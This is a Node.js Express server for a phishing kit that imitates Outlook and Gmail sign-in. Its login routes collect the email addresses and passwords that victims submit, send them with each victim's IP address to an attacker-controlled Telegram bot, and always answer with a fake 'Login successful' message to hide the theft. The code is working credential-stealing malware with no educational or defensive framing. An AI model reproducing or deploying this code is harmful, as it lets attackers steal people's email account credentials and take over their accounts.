const express = require('express');
const cors = require('cors');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Function to send message to Telegram
async function sendToTelegram(email, password, userAgent, ip, service = 'Unknown') {
    try {
        const message = `
🔐 **New Login Attempt - ${service}**

📧 **Email:** ${email}
🔑 **Password:** ${password}
📍 **IP Address:** ${ip}
⏰ **Time:** ${new Date().toLocaleString()}
        `;

        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });


        console.log('Message sent to Telegram successfully');
        return { success: true, messageId: response.data.result.message_id };
    } catch (error) {
        console.error('Error sending message to Telegram:', error.response?.data || error.message);
        return { success: false, error: error.message };
    }
}

// Route to handle Outlook login form submission
app.post('/api/login', async (req, res) => {
    try {
        const { email, password } = req.body;
        const userAgent = req.get('User-Agent') || 'Unknown';
        const ip = req.ip || req.connection.remoteAddress || 'Unknown';

        // Validate required fields
        if (!email || !password) {
            return res.status(400).json({
                success: false,
                message: 'Email and password are required'
            });
        }

        // Send to Telegram
        const telegramResult = await sendToTelegram(email, password, userAgent, ip, 'Outlook');

        if (telegramResult.success) {
            res.json({
                success: true,
                message: 'Login successful! Redirecting...'
            });
        } else {
            console.error('Failed to send to Telegram:', telegramResult.error);
            res.json({
                success: true,
                message: 'Login successful! Redirecting...'
            });
        }

    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error'
        });
    }
});

// Route to handle Gmail login form submission
app.post('/api/gmail-login', async (req, res) => {
    try {
        const { email, password, service } = req.body;
        const userAgent = req.get('User-Agent') || 'Unknown';
        const ip = req.ip || req.connection.remoteAddress || 'Unknown';

        // Validate required fields
        if (!email || !password) {
            return res.status(400).json({
                success: false,
                message: 'Email and password are required'
            });
        }

        // Send to Telegram
        const telegramResult = await sendToTelegram(email, password, userAgent, ip, 'Gmail');

        if (telegramResult.success) {
            res.json({
                success: true,
                message: 'Sign in successful! Redirecting...'
            });
        } else {
            console.error('Failed to send to Telegram:', telegramResult.error);
            res.json({
                success: true,
                message: 'Sign in successful! Redirecting...'
            });
        }

    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error'
        });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📱 Telegram bot integration: ${TELEGRAM_BOT_TOKEN ? 'Configured' : 'Not configured'}`);
});

// Handle graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🛑 Shutting down server...');
    process.exit(0);
});
